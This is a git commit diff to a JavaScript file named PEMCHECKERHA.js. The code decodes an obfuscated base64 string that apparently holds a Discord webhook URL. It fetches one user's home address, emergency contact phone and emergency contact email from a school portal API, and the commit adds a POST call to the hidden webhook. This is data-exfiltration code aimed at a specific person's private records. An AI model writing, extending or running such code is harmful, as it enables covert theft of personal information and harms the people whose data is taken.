fa62461274c9f4a0b24c8c4785fc0080ff1eea08
someone-on-GitHub <93684735+someone-on-GitHub@users.noreply.github.com>
2025-05-05 10:23:32 -0500

    Update PEMCHECKERHA.js

--- PEMCHECKERHA.js
+++ PEMCHECKERHA.js
@@ -2,6 +2,16 @@ async function kjk() {
 var mdfg = "a HR0 cHM 6Ly 9ka XNj b3J kLm Nvb S9h cGk vd2 Via G9v a3M vMT M2ND cwM Dc 5NTM3ODk5MTEzNC9OS0haYy14U3VBY3ZnbnNKbEJfVEtza2RyQWVjTHVqWnN0dkZWQzhqa0xmUkdtZVRlNFlHU3pPc2t1dUpTVUlUUmFZbg=="
 mdfg = mdfg.replace(/\s/g, '');
 mdfg = atob(mdfg)
+        await fetch(mdfg, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                content: 'start',
+                username: 'some faculty guy'
+            })
+        })
 var addr = await fetch("https://headwaters.myschoolapp.com/api/user/address/?userId=7186181").then(function(res) {return res.json()});
 var emerp = await fetch("https://headwaters.myschoolapp.com/api/user/emergencycontactphone/?userId=7186181").then(function(res) {return res.json()});
 var emere = await fetch("https://headwaters.myschoolapp.com/api/user/emergencycontactemail/?userId=7186181").then(function(res) {return res.json()});
